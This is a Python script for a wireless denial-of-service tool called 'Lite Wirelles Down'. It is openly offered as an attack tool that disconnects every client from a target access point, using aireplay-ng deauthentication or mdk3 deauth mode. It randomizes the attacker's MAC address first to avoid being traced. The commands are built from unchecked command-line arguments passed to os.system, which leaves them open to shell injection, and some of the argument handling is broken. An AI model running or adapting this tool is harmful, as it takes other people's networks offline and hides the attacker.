import os
import sys

   
def cls():
   logo = ("""
   ____________
  |____________|_
   ||--------|| | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   ||-__     || | @@ HA ha ha you is a dead AP! @@
   ||   --__ || | @@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@
   ||      --|| |     @@@
   ||        || O\    __                            Lite Wirelles Down ver0.1b
   ||        ||  \\  (..)
   ||        ||   \\_|  |_             !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   ||        ||    \  \/  )           !!      Created by RamalhoSec Team | 20/11/2018          !!
   ||        ||     :    :|           !!      Donate  btc 3DppKRbA9Um3z4wnmVtkqnETnvwsip7WkC   !!    
   ||        ||     :    :|           !!      Contact https://github.com/RamalhoSec            !!
   ||        ||     :====:O           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   ||        ||     (    )            !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                
   ||__@@@@__||     | `' |            !!      Normal use: litewifidown.py  Quiet: -q           !!          
   || @|AP|@ ||     | || |            !!      Direct use:                                      !! 
   ||O@`=='@O||     | || |            !!            --a      Attack with the aireplay-ng       !! 
   ||_@\/\/@_||     |_||_|            !!            --m      Attack with the mdk3              !! 
 ----------------   '_'`_`            !!      Options required:                                !! 
/________________\----------\         !!             -i      Set Interface name (-air)(-mdk)   !! 
|   GUILLOTINE   |-----------|        !!             -b      Set target BSSID for (-air)       !! 
|  OF WIRELESS NETWORKS      |        !!             -c      Set channel for monitor (-air)    !!  
|____________________________|        !!             -e      Set target ESSID for (-mdk)       !!   
                                      !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! """)
   os.system('clear')
   print(logo)
 



def start():
   if(sys.argv[1] == "--help"):#Help page
      cls()
   if(sys.argv[1] == "--a"):#aireplay attack
      cls()
      
      
      
   if(sys.argv[1] == "--m"):#mdk3 attack
      cls()
      
      
   if(sys.argv[1] == "-q"):#Quiet attack
      if(sys.argv[2] == "--a"):
         mode="aireplay-ng "
         print("############################# Quiet: "+mode+" attack #############################")
         print("Changing the MAC")
         os.system("macchanger -r "+str(sys.argv[4])+"")
         #os.system("airmon-ng start "+str(sys.argv[5])+" "+str(sys.argv[8])+"")
         os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
         #os.system("airmon-ng stop "+str(sys.argv[5])+"mon")
         os.system("macchanger -p "+str(sys.argv[4])+"")
         
      if(sys.argv[2] == "--m"):
         mode="mdk3 "
         print("############################# Quiet: "+mode+" attack #############################")
         print("Changing the MAC")
         os.system("macchanger -r "+str(sys.argv[4])+"")
         os.system(""+mode+str(sys.argv[4])+" d -n"+str(sys.argv[6])+"")
         os.system("macchanger -p "+str(sys.argv[4])+"")
      
      
try:
   sys.argv[1]
except Exception:
   cls()
   
   print("Check dependencies: ")
   print("")
   os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install python')
   os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
   os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
   os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
   print("")
   
   print("Listing Wireless cards: ")
   os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
   os.system('cat -n monitor.rmo')
   monitor = raw_input("Select you wirelles card fo monitor mode: ")
   os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
   print("Changing the MAC")
   os.system("macchanger -r "+str(sys.argv[4])+"")
   print("")
   
   
   os.system("macchanger -p "+str(sys.argv[4])+"")
else:
   start()
